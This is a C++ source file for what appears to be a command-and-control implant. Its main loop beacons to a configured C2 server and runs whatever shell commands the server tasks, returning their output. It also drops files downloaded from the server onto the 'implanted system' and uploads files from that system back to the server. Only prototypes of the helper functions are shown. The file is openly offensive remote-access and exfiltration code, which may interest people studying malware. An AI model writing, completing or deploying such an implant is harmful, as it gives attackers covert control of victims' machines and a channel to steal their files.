#include "functions.h"
#include "config.h"

using namespace std;

// Start of function prototypes
wstring GetProcessFilename();
wstring GetHostname();
wstring Get32BitOS();
wstring Get64BitOS();
wstring GetArchitecture();
string UTF8Encode(const wstring &PostData);
string URLEncode(const string &Value);
wstring Beacon(const wstring &BeaconURL, const wstring &UserAgent);
wstring ExtractString(const wstring Source, const wstring Start, const wstring End);
wstring ExecuteCommand(const wstring &Secondary);
void CommandUpdate(const wstring &UpdateURL, const wstring &UserAgent, const wstring &CommandOutput, const wstring &Id, const wstring &Action, const wstring &Secondary);
void DownloadFile(const wstring &Protocol, const wstring &Ip, const wstring &Secondary, const wstring &DownloadPath, const wstring &DownloadFilename);
wstring GetFilename(const wstring& Text, wchar_t Delimiter);
void Update(const wstring &UpdateURL, const wstring &UserAgent, const wstring &Id, const wstring &Action, const wstring &Secondary);
string GetContents(const string &Filename, const wstring &Secondary);
void UploadFile(const wstring &Protocol, const wstring &Ip, const wstring &Id, const wstring &Action, const wstring &Secondary, const wstring &UpdateFile, const wstring &PostBoundary, const wstring &UserAgent);
// End of function prototypes


int main()
{
	wstring BeaconURL = Protocol + L"://" + Ip + L"/" + BeaconFile;
	wstring UpdateURL = Protocol + L"://" + Ip + L"/" + UpdateFile;

	// Infinite loop
	while (true)
	{
		wstring BeaconResponse = Beacon(BeaconURL, UserAgent); // Beacons and stores response in "BeaconResponse"

		// Code modified from http://stackoverflow.com/questions/2340281/check-if-a-string-contains-a-string-in-c
		// If BeaconResponse contains a tasked command
		if (BeaconResponse.find(L"<action>command</action>") != wstring::npos)
		{
			// Parses task information
			wstring Id = ExtractString(BeaconResponse, L"<id>", L"</id>");
			wstring Action = ExtractString(BeaconResponse, L"<action>", L"</action>");
			wstring Secondary = ExtractString(BeaconResponse, L"<secondary>", L"</secondary>");

			wstring CommandOutput = ExecuteCommand(Secondary); // Executes tasked command and saves output in "CommandOutput" variable

			CommandUpdate(UpdateURL, UserAgent, CommandOutput, Id, Action, Secondary); // Updates command output to C2 server
		}

		// If BeaconResponse contains a tasked uploaded file
		// We need to download the uploaded file from the C2 server onto the implanted system
		if (BeaconResponse.find(L"<action>upload</action>") != wstring::npos)
		{
			// Parses task information
			wstring Id = ExtractString(BeaconResponse, L"<id>", L"</id>");
			wstring Action = ExtractString(BeaconResponse, L"<action>", L"</action>");
			wstring Secondary = ExtractString(BeaconResponse, L"<secondary>", L"</secondary>");

			wstring Filename = GetFilename(Secondary, '/'); // Takes "Secondary" and gets just the filename

			DownloadFile(Protocol, Ip, Secondary, DownloadPath, Filename); // Downloads file onto the implanted system

			Update(UpdateURL, UserAgent, Id, Action, Secondary); // Updates
		}

		// If BeaconResponse contains a tasked downloaded file 
		// We need to upload from the requested file from the implanted system to the C2 server
		if (BeaconResponse.find(L"<action>download</action>") != wstring::npos)
		{
			// Parses task information
			wstring Id = ExtractString(BeaconResponse, L"<id>", L"</id>");
			wstring Action = ExtractString(BeaconResponse, L"<action>", L"</action>");
			wstring Secondary = ExtractString(BeaconResponse, L"<secondary>", L"</secondary>");

			UploadFile(Protocol, Ip, Id, Action, Secondary, UpdateFile, PostBoundary, UserAgent); // Uploads file to the C2 server and updates
		}

		Sleep(BeaconInterval); // Sleeps
	}
	// End of infinite loop

	return 0;
}












